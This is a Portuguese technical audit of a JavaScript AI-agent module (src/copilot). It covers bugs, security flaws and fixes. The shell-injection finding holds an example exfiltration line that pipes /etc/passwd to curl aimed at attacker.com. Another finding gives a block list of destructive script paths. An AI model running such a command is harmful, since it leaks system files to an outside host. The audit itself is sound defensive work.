# Auditoria Técnica — Módulo `src/copilot`

> **Data**: 2026-03-25
> **Escopo**: `src/copilot/**` (101 arquivos analisados)
> **Severidade**: 🔴 Crítico · 🟠 Alto · 🟡 Médio · 🟢 Baixo · 🔵 Melhoria

---

## Sumário Executivo

A arquitetura do módulo é ambiciosa e bem concebida: o padrão `AlwaysAliveAgent → LlmBridgeClient → ConversationHub` provê uma separação de responsabilidades adequada, e o protocolo `StructuredMessage` (Sprint A) representa um avanço significativo sobre mensagens de texto puro. Contudo, a auditoria identificou **11 bugs críticos ou altos** com potencial de perda de dados ou corrupção de estado, **9 vulnerabilidades de segurança**, e aproximadamente **25 oportunidades de melhoria** de natureza técnica.

| Categoria    | Crítico | Alto | Médio | Baixo |
| ------------ | ------- | ---- | ----- | ----- |
| Bugs runtime | 4       | 5    | 6     | 3     |
| Segurança    | 2       | 3    | 4     | —     |
| Performance  | —       | 2    | 5     | 3     |
| Arquitetura  | —       | 2    | 7     | 4     |
| Type safety  | —       | 1    | 5     | 2     |

---

## 1. Bugs Críticos e de Alto Impacto

### 🔴 BUG-01 — `AlwaysAliveAgent.stop()` não para o `DialogWatchdog`

**Arquivo**: `src/copilot/agent/always-alive.js`

**Problema**: Quando `stop()` é invocado diretamente (sem passar por `stopDialogLoop()`), o watchdog continua executando o intervalo periódico. O callback `onStall` emite `dialog.stalled` num agente já destruído. Combinado com listeners SSE que ainda podem estar vivos, isso gera emissões fantasmas após o shutdown.

```javascript
// BUG: stop() nunca chama this.#watchdog.stop()
async stop({ shutdownTimeoutMs = 10_000 } = {}) {
    if (this.#status === 'stopped') return;
    // ... lógica de shutdown ...
    // this.#watchdog.stop() — AUSENTE
    if (this.#session) {
        await this.#session.disconnect();
        this.#session = null;
    }
    this.emit('stopped');
}
```

**Correção**:

```javascript
async stop({ shutdownTimeoutMs = 10_000 } = {}) {
    if (this.#status === 'stopped') return;

    // Parar dialog loop graciosamente se ativo
    if (this.#dialogLoopActive) {
        this.#dialogLoopActive = false;
        this.#watchdog.stop();  // ← ADICIONADO
    }

    this.#setStatus('stopped');
    // ... restante da lógica
}
```

---

### 🔴 BUG-02 — Leak de listener em `sendDialogTurn` no caminho `question.pending`

**Arquivo**: `src/copilot/agent/always-alive.js`

**Problema**: No ramo `else` de `sendDialogTurn` (quando o modelo ainda não atingiu `ask_user`), um timeout interno e um listener `once('dialog.reply', ...)` são criados dentro do callback `onPending`. Se `dialog.stopped` disparar antes de `dialog.reply`, o `once('dialog.reply')` interno nunca é removido, e o `newTimeout` nunca é limpo — leak de listener + timer órfão.

```javascript
// BUG: dialog.stopped não limpa o newTimeout nem o dialog.reply listener interno
const onPending = (_) => {
    clearTimeout(timeoutHandle);
    const newTimeout = setTimeout(() => reject(...), timeout);
    this.once('dialog.reply', (evt) => {
        clearTimeout(newTimeout);  // só limpo se dialog.reply vier
        resolve(evt.reply);
    });
    // Se dialog.stopped disparar aqui: newTimeout vaza, dialog.reply listener vaza
    this.answerPendingQuestion(message);
};
this.once('question.pending', onPending);
```

**Correção**:

```javascript
const onPending = (_) => {
    clearTimeout(timeoutHandle);
    const newTimeout = setTimeout(() => {
        this.off('dialog.reply', onReply);
        this.off('dialog.stopped', onStop);
        reject(new SessionError(`sendDialogTurn timeout após ${timeout}ms`, 'DIALOG_TIMEOUT'));
    }, timeout);

    const onReply = (evt) => {
        clearTimeout(newTimeout);
        this.off('dialog.stopped', onStop);
        resolve(evt.reply);
    };
    const onStop = () => {
        clearTimeout(newTimeout);
        this.off('dialog.reply', onReply);
        reject(new SessionError('Diálogo encerrado pelo modelo.', 'DIALOG_ENDED'));
    };

    this.once('dialog.reply', onReply);
    this.once('dialog.stopped', onStop);
    this.answerPendingQuestion(message);
};
```

---

### 🔴 BUG-03 — Race condition em `ConversationStore.writeTurn` (violação de sequência de `turn_number`)

**Arquivo**: `src/copilot/conversation-hub/store.js`

**Problema**: O cálculo de `turn_number` é feito com `SELECT MAX(turn_number)` fora de uma transação. Se dois turnos forem escritos concorrentemente (e.g., um turno de `user` injetado via Socket.io enquanto `sendToLlmB` está em execução), ambos podem obter o mesmo `max_turn` e serem inseridos com o mesmo `turn_number`. `better-sqlite3` é síncrono e single-threaded em Node.js; o risco real ocorre em workers ou processos paralelos, mas é uma falha de design que tornará o sequenciamento imprevisível quando o ConversationHub for usado em modo multi-tenant.

```javascript
// BUG: SELECT + INSERT sem transação
const maxTurn = db
    .prepare(`SELECT MAX(turn_number) as max_turn FROM copilot_conversation_turns WHERE hub_session_id = ?`)
    .get(hubSessionId);
const turnNumber = (maxTurn?.max_turn ?? 0) + 1;
// ← outra operação pode inserir aqui com o mesmo turnNumber
const result = db.prepare(`INSERT INTO ... (turn_number, ...) VALUES (?, ...)`).run(..., turnNumber, ...);
```

**Correção**:

```javascript
writeTurn(hubSessionId, opts) {
    const db = this.#getDb();

    // Transação atômica garante sequência correta mesmo sob concorrência
    const doWrite = db.transaction(() => {
        const maxTurn = db
            .prepare(`SELECT MAX(turn_number) as max_turn FROM copilot_conversation_turns WHERE hub_session_id = ?`)
            .get(hubSessionId);
        const turnNumber = (maxTurn?.max_turn ?? 0) + 1;
        const userRead = opts.role === 'user' ? 0 : 1;

        const result = db.prepare(`INSERT INTO copilot_conversation_turns (...) VALUES (...)`).run(...);
        db.prepare(`UPDATE copilot_hub_sessions SET updated_at = ? WHERE id = ?`).run(Date.now(), hubSessionId);

        return Number(result.lastInsertRowid);
    });

    return doWrite();
}
```

---

### 🔴 BUG-04 — `parseError` nunca populado em `StructuredChatResult`

**Arquivos**: `src/copilot/channel/client.js` · `src/copilot/conversation-hub/orchestrator.js`

**Problema**: `orchestrator.js` acessa `result.parseError` esperando que o campo seja preenchido pelo `LlmBridgeClient.chatStructured()`. Mas `chatStructured` em `client.js` nunca define `parseError` no objeto retornado — o campo simplesmente não existe. Toda a lógica de tratamento de erro de parse no orquestrador é silenciosamente inoperante.

```javascript
// client.js — parseError NUNCA é definido
return {
    structured,
    raw: chatResult.response,
    taskId: chatResult.taskId,
    responseLen: chatResult.responseLen,
    chunks: chatResult.chunks,
    durationMs: chatResult.durationMs,
    // parseError: ??? — AUSENTE
};

// orchestrator.js — condição nunca será verdadeira
if (result.parseError !== undefined) parseError = result.parseError;
```

**Correção em `client.js`**:

```javascript
const structured = parseStructuredResponse(chatResult.response);
let parseError;

if (chatResult.response && !structured) {
    // Resposta veio mas não pôde ser parseada como StructuredMessage
    parseError = new Error(`Resposta de LLM-B não é um StructuredMessage válido (${chatResult.responseLen} chars)`);
}

return {
    structured,
    raw: chatResult.response,
    taskId: chatResult.taskId,
    responseLen: chatResult.responseLen,
    chunks: chatResult.chunks,
    durationMs: chatResult.durationMs,
    parseError,  // ← ADICIONADO
};
```

**Atualizar typedef em `structured-message.js`**:

```javascript
/**
 * @typedef {Object} StructuredChatResult
 * @property {StructuredMessage | null} structured
 * @property {string} raw
 * @property {string} taskId
 * @property {number} responseLen
 * @property {string[]} chunks
 * @property {number} durationMs
 * @property {Error | undefined} parseError  ← ADICIONADO
 */
```

---

### 🟠 BUG-05 — Mutação ilegal de `ReadonlyArray` em `commands/context.js`

**Arquivo**: `src/copilot/terminal/commands/context.js`

**Problema**: `llmBridgeClient.history` é declarado como `ReadonlyArray<ConversationTurn>`. O código em `cmdCompact` tenta limpar e repovoar esse array diretamente, o que silenciosamente falha em modo estrito ou produz comportamento indefinido.

```javascript
// BUG: history é ReadonlyArray — .length = 0 e .push() não funcionam
if (Array.isArray(llmBridgeClient.history)) {
    llmBridgeClient.history.length = 0;   // ← falha silenciosa
    llmBridgeClient.history.push({ role: 'assistant', content: reply });  // ← erro de tipo
}
```

**Correção**: Usar a API pública do cliente.

```javascript
// Limpar histórico via API pública
llmBridgeClient.clearHistory();

// Re-adicionar o resumo via método interno — expor novo método:
// Em LlmBridgeClient:
seedHistory(role, content) {
    this.#history.push({ role, content, timestamp: Date.now() });
}

// Em cmdCompact:
llmBridgeClient.clearHistory();
llmBridgeClient.seedHistory('assistant', reply);
```

---

### 🟠 BUG-06 — `#getActiveSdkSessionId` em `orchestrator.js` ignora o `agentOverride`

**Arquivo**: `src/copilot/conversation-hub/orchestrator.js`

**Problema**: O construtor aceita `agentOverride` e armazena em `this.#agent`, mas `#getActiveSdkSessionId()` acessa diretamente `alwaysAliveAgent` (hardcoded), quebrando o isolamento de testes.

```javascript
// BUG: usa alwaysAliveAgent diretamente, ignorando this.#agent
#getActiveSdkSessionId() {
    try {
        const snap = alwaysAliveAgent.getStatusSnapshot();  // ← hardcoded
        return snap.sessionId;
    } catch {
        return undefined;
    }
}
```

**Correção**:

```javascript
#getActiveSdkSessionId() {
    try {
        const agent = this.#agent ?? alwaysAliveAgent;  // ← respeita override
        const snap = /** @type {{ sessionId?: string }} */ (agent.getStatusSnapshot());
        return snap.sessionId;
    } catch {
        return undefined;
    }
}
```

---

### 🟠 BUG-07 — `AlwaysAliveAgent.stop()` enquanto `status === 'starting'`

**Arquivo**: `src/copilot/agent/always-alive.js`

**Problema**: Se `stop()` é chamado enquanto `start()` ainda está em execução (status `'starting'`), o método prossegue com o shutdown imediatamente. Quando `start()` eventualmente completar, ele tentará configurar a sessão numa instância marcada como `stopped`, podendo emitir eventos em estado inválido.

```javascript
// BUG: status 'starting' não é tratado em stop()
async stop(...) {
    if (this.#status === 'stopped') return;
    // 'starting' cai aqui sem aguardar o start() terminar
    this.#setStatus('stopped');
    // ...
}
```

**Correção**:

```javascript
async stop({ shutdownTimeoutMs = 10_000 } = {}) {
    if (this.#status === 'stopped') return;

    // Aguardar boot completar antes de parar (com timeout de segurança)
    if (this.#status === 'starting') {
        log('INFO', '[AlwaysAlive] stop() durante boot — aguardando ready (máx 15s)...');
        await Promise.race([
            new Promise(r => this.once('ready', r)),
            new Promise(r => this.once('error', r)),
            new Promise(r => setTimeout(r, 15_000)),
        ]);
    }
    // ...
}
```

---

### 🟠 BUG-08 — `DialogWatchdog` duplicado no construtor e em `startDialogLoop`

**Arquivo**: `src/copilot/agent/always-alive.js`

**Problema**: O construtor instancia `this.#watchdog` mas nunca o inicia. `startDialogLoop` então substitui `this.#watchdog` por uma nova instância. A instância do construtor é descartada sem cleanup — embora sem timer ativo, é um anti-padrão que confunde a leitura.

```javascript
// Construtor — instância nunca iniciada, substituída depois
constructor(options = {}) {
    // ...
    this.#watchdog = new DialogWatchdog({...});  // ← nunca chamada .start()
}

// startDialogLoop — substitui silenciosamente
async startDialogLoop(bootPrompt) {
    this.#watchdog = new DialogWatchdog({...});  // ← nova instância
    this.#watchdog.start();
}
```

**Correção**: Remover a instanciação do construtor e usar um inicializador lazy.

```javascript
/** @type {DialogWatchdog | null} */
#watchdog = null;

async startDialogLoop(bootPrompt) {
    this.#watchdog = new DialogWatchdog({
        intervalMs: AlwaysAliveAgent.#WATCHDOG_INTERVAL_MS,
        stallMs: AlwaysAliveAgent.#WATCHDOG_STALL_MS,
        onStall: (stalledMs) => this.emit('dialog.stalled', { stalledMs }),
    });
    this.#watchdog.start();
    // ...
}

async stopDialogLoop() {
    if (!this.#dialogLoopActive) return;
    if (this.#pendingQuestion) this.answerPendingQuestion('STOP_DIALOG');
    this.#dialogLoopActive = false;
    this.#watchdog?.stop();
    this.#watchdog = null;
}
```

---

### 🟠 BUG-09 — Dynamic import em hot-path de autenticação Socket.io

**Arquivo**: `src/copilot/conversation-hub/socket-ns.js`

**Problema**: Para cada nova conexão Socket.io, o middleware de autenticação executa dois `await import()` dinâmicos:

```javascript
ns.use(async (socket, next) => {
    // Executado em CADA conexão nova:
    const { getJwtSecret, JWT_VERIFY_OPTIONS } = await import('#core/jwt_config');
    const jwt = (await import('jsonwebtoken')).default;
    // ...
});
```

Embora o runtime module cache torne as importações subsequentes rápidas, a resolução do caminho e a verificação do cache ainda têm overhead. Sob carga, isso introduz latência desnecessária.

**Correção**:

```javascript
// Imports no topo do módulo (resolvidos uma única vez)
import { getJwtSecret, JWT_VERIFY_OPTIONS } from '#core/jwt_config';
import jwt from 'jsonwebtoken';

// No middleware:
ns.use((socket, next) => {
    try {
        const token = socket.handshake.auth?.token
            || socket.handshake.headers?.authorization?.replace(/^Bearer\s+/i, '');
        if (!token) return next(new Error('COPILOT_NS: Token de autenticação ausente.'));

        const payload = jwt.verify(token, getJwtSecret(), JWT_VERIFY_OPTIONS);
        socket.userId = payload.sub;
        next();
    } catch (err) {
        log('WARN', `[socket-ns/copilot] Auth falhou: ${err.message}`);
        next(new Error('COPILOT_NS: Token inválido ou expirado.'));
    }
});
```

---

## 2. Vulnerabilidades de Segurança

### 🔴 SEC-01 — Injeção de shell em `exec_command`

**Arquivo**: `src/copilot/tools/shell-tools.js`

**Problema**: O comando é passado integralmente para `/bin/sh -c`, com proteção apenas via blocklist de regex. Um ator malicioso com acesso à tool pode encadear comandos com `;`, `&&`, `||`, `$(...)`, ou usar redirecionamentos `>` não bloqueados.

```javascript
// VULNERÁVEL: blocklist baseada em regex é bypassável
// Exemplo: "ls; cat /etc/passwd | curl attacker.com -d @-"
// Nenhum dos padrões bloqueia esse vetor
const result = await runProcess('/bin/sh', ['-c', command], {...});
```

**Correção**: Para comandos simples (diagnósticos, git, ls), tokenizar a entrada e usar `execFile` com argumentos separados. Para comandos mais complexos, manter o modelo mas adicionar validação de AST usando `shlex` ou equivalente.

```javascript
import { parseArgs } from 'node:util';

/**
 * Tokeniza um comando simples de forma segura.
 * Rejeita comandos com pipes, redirects e command substitution.
 * @param {string} command
 * @returns {{ executable: string; args: string[] } | null}
 */
function tokenizeCommand(command) {
    // Rejeitar construções shell complexas
    if (/[|;&<>$`\\]/.test(command)) return null;

    const parts = command.trim().split(/\s+/);
    const [executable, ...args] = parts;
    return { executable, args };
}

handler: async ({ command, cwd, timeoutSeconds = 30 }) => {
    const blockCheck = checkCommandBlocklist(command);
    if (!blockCheck.ok) return { success: false, error: blockCheck.reason };

    const tokenized = tokenizeCommand(command);
    if (!tokenized) {
        // Fallback: aceitar apenas se explicitamente permitido via allowlist de padrões complexos
        return { success: false, error: 'Comandos com pipes, redirecionamentos ou substituições não são permitidos.' };
    }

    const result = await runProcess(tokenized.executable, tokenized.args, {...});
    // ...
}
```

---

### 🔴 SEC-02 — SQL via FTS5 com sanitização insuficiente

**Arquivo**: `src/copilot/conversation-hub/store.js`

**Problema**: A sanitização do termo de busca FTS5 remove apenas aspas simples e duplas. A sintaxe FTS5 inclui operadores (`AND`, `OR`, `NOT`, `NEAR`, `*`, `^`) e colunas (`tag:`, `content:`) que permitem consultas não intencionais.

```javascript
// Sanitização insuficiente — operadores FTS5 passam intactos
const ftsQuery = opts.search.replace(/['"]/g, ' ');
db.prepare(`... WHERE copilot_memories_fts MATCH ?`).all(ftsQuery, ...);
```

**Correção**: Escapar todos os caracteres especiais do FTS5 ou usar apenas busca por prefixo/frase simples.

```javascript
/**
 * Sanitiza query para uso seguro com FTS5 do SQLite.
 * Converte a string em uma busca de frase exata entre aspas duplas.
 */
function sanitizeFtsQuery(query) {
    // Remove aspas duplas da query e envolve em aspas duplas (frase exata)
    const escaped = query.replace(/"/g, ' ').trim();
    if (!escaped) return null;
    return `"${escaped}"`;  // FTS5 trata como frase exata
}

// Uso:
const ftsQuery = sanitizeFtsQuery(opts.search);
if (!ftsQuery) return [];
db.prepare(`... WHERE copilot_memories_fts MATCH ?`).all(ftsQuery, ...);
```

---

### 🟠 SEC-03 — Injeção de shell em `search_in_files` via parâmetros ripgrep

**Arquivo**: `src/copilot/tools/file-tools.js`

**Problema**: O padrão e os flags são concatenados em string de comando passada ao `execSync`. A sanitização com `replace(/'/g, "'\\''")`  não é suficiente para todos os vetores:

```javascript
// Vulnerável: o path também é interpolado e pode conter metacaracteres
const cmd = `rg ${flags} -e '${safePattern}' '${resolved}' 2>&1 | head -c ${MAX_SEARCH_OUTPUT}`;
const output = execSync(cmd, {...});
```

**Correção**: Usar `execFile` com argumentos separados.

```javascript
import { execFile } from 'node:child_process';

const args = [
    '--color=never', '--no-heading',
    ...(isRegex ? [] : ['--fixed-strings']),
    ...(caseSensitive ? [] : ['--ignore-case']),
    `--context=${contextLines}`,
    `--max-count=${maxResults}`,
    ...(includePattern ? [`--glob=${includePattern}`] : []),
    `--glob=!node_modules`, `--glob=!.git`, `--glob=!dist`,
    '-e', pattern,          // ← argumento separado, sem interpolação
    resolved,
];

const { stdout } = await execFileAsync('rg', args, {
    cwd: WORKSPACE_ROOT,
    encoding: 'utf8',
    timeout: 30_000,
    maxBuffer: MAX_SEARCH_OUTPUT * 2,
});
```

---

### 🟠 SEC-04 — Verificação de proprietário em `validatePath` insuficiente para symlinks

**Arquivo**: `src/copilot/tools/file-tools.js`

**Problema**: `validatePath` usa `path.relative()` para detectar path traversal, mas não resolve symlinks antes da verificação. Um symlink dentro do workspace apontando para fora (`/workspaces/proj/link -> /etc/passwd`) passaria na verificação.

```javascript
// BUG: resolve relative path but not symlinks
const resolved = path.isAbsolute(filePath) ? filePath : path.resolve(WORKSPACE_ROOT, filePath);
const relativeToWorkspace = path.relative(WORKSPACE_ROOT, resolved);
// relativeToWorkspace = "link" → parece seguro, mas resolve para /etc/passwd
```

**Correção**:

```javascript
import { realpathSync } from 'node:fs';

function validatePath(filePath) {
    const resolved = path.isAbsolute(filePath)
        ? filePath
        : path.resolve(WORKSPACE_ROOT, filePath);

    // Resolver symlinks ANTES de verificar o boundary
    let realResolved;
    try {
        realResolved = realpathSync(resolved);
    } catch {
        // Arquivo não existe ainda (ex: create_file) — usar resolved sem symlink
        realResolved = resolved;
    }

    const relativeToWorkspace = path.relative(WORKSPACE_ROOT, realResolved);
    if (relativeToWorkspace.startsWith('..')) {
        return { ok: false, reason: `Acesso negado: caminho fora do workspace (${realResolved})`, resolved: realResolved };
    }
    // ...
}
```

---

### 🟡 SEC-05 — `run_node_file` sem verificação de arquivo executável externo

**Arquivo**: `src/copilot/tools/shell-tools.js`

**Problema**: Qualquer arquivo `.js`/`.mjs`/`.cjs` dentro do workspace pode ser executado. Isso inclui scripts de configuração sensíveis (e.g., `scripts/seed-db.js`, `scripts/drop-all.js`) que poderiam não ser intencionalmente permitidos para execução por LLM-B.

**Melhoria proposta**: Adicionar uma allowlist opcional de caminhos autorizados ou uma lista de bloqueio de padrões de caminho.

```javascript
const BLOCKED_NODE_PATH_PATTERNS = [
    /scripts\/seed/i,
    /scripts\/drop/i,
    /scripts\/reset/i,
    /scripts\/migrate.*down/i,
    /scripts\/destroy/i,
];

// No handler:
const relative = path.relative(WORKSPACE_ROOT, resolved);
for (const pattern of BLOCKED_NODE_PATH_PATTERNS) {
    if (pattern.test(relative)) {
        return { success: false, error: `Arquivo bloqueado por política de segurança: ${relative}` };
    }
}
```

---

## 3. Problemas de Performance

### 🟠 PERF-01 — I/O de disco síncrono em hot-path de `sendMessage`

**Arquivo**: `src/copilot/agent/always-alive.js` · `src/copilot/agent/session-manager.js`

**Problema**: `#processQueue()` é chamado para cada mensagem enfileirada e executa:

```javascript
const state = readState();                            // readFileSync
writeState({ sendCount: (state?.sendCount ?? 0) + 1 }); // writeFileSync
```

Dois acessos síncronos de disco por mensagem. Em cenários de alta frequência (e.g., pipeline com 10+ tarefas), isso degrada o throughput e bloqueia o event loop.

**Correção**: Manter `sendCount` e `resumeCount` em memória, persistindo apenas em pontos explícitos (stop, reconnect).

```javascript
// No AlwaysAliveAgent:
#sendCount = 0;  // ← in-memory counter

#processQueue() {
    // ...
    this.#sendCount++;
    // Flush para disco apenas a cada 10 mensagens ou no stop()
    if (this.#sendCount % 10 === 0) {
        const state = readState();
        writeState({ sendCount: (state?.sendCount ?? 0) + 10 });
    }
}

getStatusSnapshot() {
    const state = readState();  // ainda necessário para outros campos
    return {
        // ...
        sendCount: this.#sendCount,  // ← da memória, não do disco
    };
}
```

---

### 🟠 PERF-02 — `getStatusSnapshot()` lê disco em cada chamada

**Arquivo**: `src/copilot/agent/always-alive.js`

**Problema**: `getStatusSnapshot()` chama `readState()` que faz `readFileSync` toda vez que é invocado. Em ambientes onde o dashboard faz polling ou o health check é chamado frequentemente, isso cria I/O contínuo.

```javascript
getStatusSnapshot() {
    const state = readState();  // readFileSync em cada chamada
    // ...
}
```

**Correção**: Cache em memória com TTL.

```javascript
#cachedState = null;
#cacheExpiry = 0;
static #CACHE_TTL_MS = 2_000;

#getState() {
    const now = Date.now();
    if (!this.#cachedState || now > this.#cacheExpiry) {
        this.#cachedState = readState();
        this.#cacheExpiry = now + AlwaysAliveAgent.#CACHE_TTL_MS;
    }
    return this.#cachedState;
}
```

---

### 🟡 PERF-03 — FTS5 triggers síncronos sem `WITHOUT ROWID` optimization

**Arquivo**: `src/copilot/conversation-hub/store.js`

**Problema**: Os triggers FTS5 são executados em cada `INSERT`/`UPDATE`/`DELETE` na tabela `copilot_memories`. Com SQLite em modo WAL, isso é aceitável para volumes baixos. Mas a tabela FTS não usa `content=''` (external content), o que significa que cada memória é armazenada duas vezes (tabela base + índice FTS).

**Melhoria**: Usar `content=copilot_memories` (já está correto) com `content_rowid='rowid'` e garantir que os triggers mantenham sincronia. O DDL atual já usa essa configuração — porém deveria adicionar o índice `tokenize='porter unicode61'` para melhor relevância em português:

```sql
CREATE VIRTUAL TABLE IF NOT EXISTS copilot_memories_fts USING fts5(
    id UNINDEXED,
    tag,
    content,
    content='copilot_memories',
    content_rowid='rowid',
    tokenize='porter unicode61'  -- ← suporte a stemming pt-BR
);
```

---

## 4. Problemas de Arquitetura

### 🟠 ARCH-01 — Acúmulo de re-exports deprecated sem plano de remoção

**Arquivos**: `src/copilot/*.js` (13 arquivos de re-export)

**Problema**: O projeto mantém uma camada inteira de arquivos de compatibilidade retroativa (`agent.js`, `always-alive.js`, `alias-store.js`, `gh-bridge.js`, `git-bridge.js`, `http-bridge.js`, `inject-llmb.js`, `llm-bridge-client.js`, `mcp-tool-bridge.js`, `nerv-bridge.js`, `sdk-api.js`, `sdk-client.js`, `session-manager.js`). Esses arquivos têm `@deprecated` no JSDoc mas nenhuma versão planejada para remoção. Eles adicionam complexidade à resolução de módulos e confundem novos desenvolvedores sobre qual caminho importar.

**Melhoria**: Criar um `MIGRATION.md` formal e definir uma versão de remoção (ex: v5.0). Enquanto isso, adicionar warnings em runtime:

```javascript
// src/copilot/always-alive.js
import { createDeprecationWarning } from '#core/deprecation';

createDeprecationWarning(
    'src/copilot/always-alive.js',
    'Use src/copilot/agent/always-alive.js ou o alias #copilot/agent',
    { since: '4.0', removeIn: '5.0' }
);

export { AlwaysAliveAgent, alwaysAliveAgent } from './agent/always-alive.js';
```

---

### 🟠 ARCH-02 — `nerv-bridge.js` mapeia apenas 9 de 22 eventos do agente

**Arquivo**: `src/copilot/bridges/nerv-bridge.js`

**Problema**: O `EVENT_MAP` cobre apenas 9 eventos, perdendo eventos críticos:

```javascript
// Ausentes do EVENT_MAP:
// 'task.delta'           — streaming de tokens
// 'task.completed'       — conclusão de tarefa
// 'task.error'           — falha de tarefa
// 'ready'                — agente pronto (vs 'started' que mapeia)
// 'error'                — erros genéricos
// 'session.compaction_start'
// 'session.compaction_complete'
// 'session.fatal'        — ← CRÍTICO: não propagado ao NERV
// 'session.usage'
// 'session.mode_changed'
// 'dialog.ready' / 'dialog.reply' / 'dialog.stopped' / 'dialog.stalled'
// 'tool.execution.start' / 'tool.execution.complete'
```

**Correção**: Gerar o mapa diretamente de `AGENT_EVENTS`:

```javascript
import { AGENT_EVENTS } from '../agent/events.js';

// Mapear todos os eventos com prefixo COPILOT_AGENT_
const EVENT_MAP = AGENT_EVENTS.map(event => ({
    event,
    actionCode: `COPILOT_${event.toUpperCase().replace(/\./g, '_')}`,
}));
// Ex: 'session.fatal' → 'COPILOT_SESSION_FATAL'
//     'task.delta'    → 'COPILOT_TASK_DELTA'
```

---

### 🟡 ARCH-03 — `LlmBridgeClient` tem múltiplas instâncias independentes com históricos isolados

**Arquivos**: `src/copilot/channel/client.js` · `src/copilot/conversation-hub/orchestrator.js` · `src/copilot/terminal/dialog.js`

**Problema**:
- `orchestrator.js` cria `new LlmBridgeClient()` em `init()`
- `terminal/dialog.js` usa `llmBridgeClient` (singleton)
- Scripts standalone criam instâncias próprias

Cada instância mantém seu próprio array `#history`, que diverge silenciosamente. O `ConversationStore` (SQLite) é a fonte de verdade canônica, mas o histórico in-memory de `LlmBridgeClient` não sincroniza com ele.

**Melhoria**: Tornar o `LlmBridgeClient` ciente do `ConversationStore` ou remover o histórico in-memory e delegar toda persistência ao hub.

---

### 🟡 ARCH-04 — Boot do `ConversationHub` falha silenciosamente sem feedback observável

**Arquivo**: `src/copilot/conversation-hub/hub.js` · `src/server/main.js`

**Problema**: Conforme o plano de integração, o hub é inicializado na FASE 10 com:

```javascript
try {
    await conversationHub.init({ io, nerv });
} catch (_e) {
    log('WARN', `[HUB] Falha ao iniciar ConversationHub: ${_e.message} (degradação elegante)`);
}
```

Se o hub falhar, o log diz "degradação elegante" mas:
1. `GET /api/copilot/health` não reflete o estado do hub
2. As hub tools (`hub_create_session` etc.) lançarão `Error` quando invocadas
3. Não há endpoint para consultar se o hub está degradado

**Melhoria**: Adicionar estado de saúde ao hub e expô-lo via health endpoint.

```javascript
// Em ConversationHub:
get health() {
    return {
        initialized: this.#initialized,
        storeReady: this.#initialized && conversationStore !== null,
        error: this.#lastError?.message ?? null,
    };
}

// Em GET /api/copilot/health:
res.json({
    healthy,
    hub: conversationHub.health,  // ← adicionado
    // ...
});
```

---

### 🟡 ARCH-05 — `session-manager.js` usa `import.meta.dirname` que pode falhar em bundles

**Arquivo**: `src/copilot/agent/session-manager.js`

**Problema**:

```javascript
const ROOT = resolve(import.meta.dirname, '../../');
```

`import.meta.dirname` foi estabilizado no Node.js 21.2.0 / 20.11.0. Para versões anteriores (o ambiente declara Node.js 24+, então isso é aceitável), mas também falha em ambientes de bundling (esbuild, rollup) onde `import.meta.dirname` não é definido automaticamente.

**Melhoria**: Para robustez, usar a abordagem `fileURLToPath` que é universalmente suportada:

```javascript
import { fileURLToPath } from 'node:url';
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = resolve(__dirname, '../../');
```

---

## 5. Problemas de Type Safety

### 🟠 TYPE-01 — `dialogLoopActive` acessado via cast `any` em `orchestrator.js`

**Arquivo**: `src/copilot/conversation-hub/orchestrator.js`

**Problema**:

```javascript
const useDialogLoop = /** @type {any} */ (agentInst).dialogLoopActive === true;
```

O cast para `any` contorna a tipagem. `AlwaysAliveAgent` já expõe `dialogLoopActive` como getter público — deveria ser tipado corretamente.

**Correção**: Definir um tipo para o agente injetado.

```javascript
/**
 * @typedef {Pick<import('../agent/always-alive.js').AlwaysAliveAgent,
 *   'getStatusSnapshot' | 'dialogLoopActive' | 'sendDialogTurn'>} AgentLike
 */

/** @type {AgentLike | null} */
#agent = null;
```

---

### 🟡 TYPE-02 — `StructuredMessage.priority` inclui `'critical'` mas a documentação diz `'low'|'medium'|'high'`

**Arquivo**: `src/copilot/types/structured-message.js` · `LLM-A-COMMUNICATION-GUIDE.md`

**Problema**: O schema define `priority: z.enum(['low', 'medium', 'high', 'critical'])` mas o guide documenta apenas três níveis. O hub-tools também usa `'critical'` corretamente, mas o typedef em `structured-message.js` mapeia a documentação:

```javascript
/**
 * @property {'low' | 'medium' | 'high'} [priority]  ← FALTANDO 'critical'
 */
```

O typedef e a documentação estão desatualizados em relação ao schema.

**Correção**: Atualizar o typedef e o `COMMUNICATION-GUIDE.md`.

---

### 🟡 TYPE-03 — `bridge-tasks.js` tipagem incorreta do body em `POST /send`

**Arquivo**: `src/copilot/api/bridge-tasks.js`

**Problema**: O `attachments` do body é usado mas o tipo JSDoc de `req.body` não o inclui, causando erro de tipo implícito.

```javascript
// Tipo declarado implicitamente como any via req.body ?? {}
const { message, waitForResponse = false, timeoutMs = 30000, attachments } = req.body ?? {};
```

**Melhoria**:

```javascript
/**
 * @typedef {{
 *   message: string;
 *   waitForResponse?: boolean;
 *   timeoutMs?: number;
 *   attachments?: import('@github/copilot-sdk').MessageOptions['attachments'];
 * }} SendRequestBody
 */

const body = /** @type {SendRequestBody} */ (req.body ?? {});
const { message, waitForResponse = false, timeoutMs = 30000, attachments } = body;
```

---

### 🟡 TYPE-04 — `hub-tools.js` usa `z.record(z.string(), z.any())` para metadata

**Arquivo**: `src/copilot/tools/hub-tools.js`

```javascript
metadata: z.record(z.string(), z.any()).optional()
```

`z.any()` desabilita a validação do valor. Para metadados de hub session, os valores deveriam ser primitivos serializáveis em JSON.

**Melhoria**:

```javascript
metadata: z.record(z.string(), z.union([
    z.string(),
    z.number(),
    z.boolean(),
    z.null(),
    z.array(z.string()),
])).optional()
```

---

## 6. Lacunas de Funcionalidade

### 🟡 GAP-01 — Ausência de rate limiting no endpoint `POST /inject`

**Arquivo**: `src/copilot/terminal/server.js`

**Problema**: O endpoint `POST /inject` não tem nenhum controle de taxa. Um processo mal comportado pode inundar o dialog loop com requisições, degradando a experiência do usuário humano.

**Proposta**:

```javascript
// Em terminal/server.js:
const _injectCounts = new Map();  // IP → { count, resetAt }

function checkRateLimit(ip) {
    const now = Date.now();
    const entry = _injectCounts.get(ip) ?? { count: 0, resetAt: now + 60_000 };

    if (now > entry.resetAt) {
        entry.count = 0;
        entry.resetAt = now + 60_000;
    }

    entry.count++;
    _injectCounts.set(ip, entry);

    const MAX_RPM = Number(process.env.LLM_B_INJECT_RPM ?? 20);
    return entry.count <= MAX_RPM;
}

// No handler de /inject:
const ip = req.socket.remoteAddress ?? '0.0.0.0';
if (!checkRateLimit(ip)) {
    res.writeHead(429, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ ok: false, error: 'Rate limit excedido. Aguarde 1 minuto.' }));
    return;
}
```

---

